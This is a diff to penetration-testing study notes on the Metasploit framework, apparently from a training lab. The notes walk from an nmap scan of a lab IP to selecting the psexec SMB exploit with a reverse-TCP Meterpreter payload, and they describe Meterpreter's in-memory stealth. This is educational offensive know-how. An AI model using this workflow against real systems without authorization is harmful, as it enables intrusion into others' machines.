@@ -2,9 +2,13 @@
 
 ## Overview
 
-Metasploit automates the entire exploit → payload → shell process. Instead of manually crafting one-liners, you select a module, set options, and run it. It contains **2,000+ exploits** and **590+ payloads** ready to use.
+Metasploit is an automated attack framework developed by **Rapid7** that streamlines exploiting vulnerabilities through pre-built modules. It contains **2,000+ exploits** and **590+ payloads** ready to use.
 
-> Metasploit makes exploitation easy, but you're responsible for understanding what it's doing. Using tools blindly in a live engagement can be destructive.
+> ⚠️ Metasploit makes exploitation easy, but you're responsible for understanding what it's doing. Using tools blindly in a live engagement can be destructive.
+
+**Editions:**
+- **Community Edition** — Free, included in Kali/Pwnbox
+- **Metasploit Pro** — Paid, used by professional pentest firms (includes social engineering campaigns, advanced reporting)
 
 ---
 
@@ -34,6 +38,13 @@ Metasploit automates the entire exploit → payload → shell process. Instead o
 sudo msfconsole
 ```
 
+```
+       =[ metasploit v6.0.44-dev                          ]
++ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 8 evasion                                       ]
+```
+
 > Always run as root (`sudo`) — many modules need raw socket access.
 
 ---
@@ -43,10 +54,18 @@ sudo msfconsole
 ### Step 1: Nmap scan to identify services
 
 ```bash
-nmap -sC -sV -Pn TARGET_IP
+nmap -sC -sV -Pn 10.129.164.25
 ```
 
-Look for services + versions → pick an attack vector.
+Example output:
+```
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds
+```
+
+Look for services + versions → pick an attack vector (SMB on 445).
 
 ### Step 2: Search Metasploit for matching modules
 
@@ -54,7 +73,9 @@ Look for services + versions → pick an attack vector.
 msf6 > search smb
 ```
 
-> Returns a table of modules. Key columns: **Name**, **Rank**, **Description**.
+Returns a table with columns: **#** (number), **Name**, **Disclosure Date**, **Rank**, **Check**, **Description**
+
+> The number to the left is relative to your search — it may change. Use it with `use <number>` to quickly select a module.
 
 ---
 
@@ -64,10 +85,11 @@ Example: `exploit/windows/smb/psexec`
 
 | Part | Meaning |
 |------|---------|
-| `exploit/` | Module type — this is an exploit (not scanner, not auxiliary) |
+| `56` | Number assigned in search results (use `use 56` to select) |
+| `exploit/` | Module type — this is an exploit module |
 | `windows/` | Target platform |
 | `smb/` | Target service / attack vector |
-| `psexec` | The specific tool/technique used |
+| `psexec` | The tool that gets uploaded to the target |
 
 ---
 
@@ -76,7 +98,10 @@ Example: `exploit/windows/smb/psexec`
 ### Select the module:
 
 ```
-msf6 > use exploit/windows/smb/psexec
+msf6 > use 56
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+msf6 exploit(windows/smb/psexec) >
 ```
 
 > MSF automatically assigns a default payload: `windows/meterpreter/reverse_tcp`
@@ -86,6 +111,10 @@ msf6 > use exploit/windows/smb/psexec
 ```
 msf6 exploit(windows/smb/psexec) > options
 ```
+
+Shows two sections:
+- **Module options** — Target settings (RHOSTS, credentials, share)
+- **Payload options** — Callback settings (LHOST, LPORT)
 
 ### Configure required settings:
 
@@ -188,3 +217,5 @@ meterpreter > ?
 | **Meterpreter is stealthy** | In-memory DLL injection, no files written to disk |
 | **Always understand the module** | Read the description and options before running — don't be reckless |
 | **LHOST matters** | Must be your VPN tunnel IP, not your local network IP |
+| **Module numbers change** | The search result number is relative — don't memorize it |
+| **PSExec cleans up** | This module auto-removes the service it creates (randomly named) |
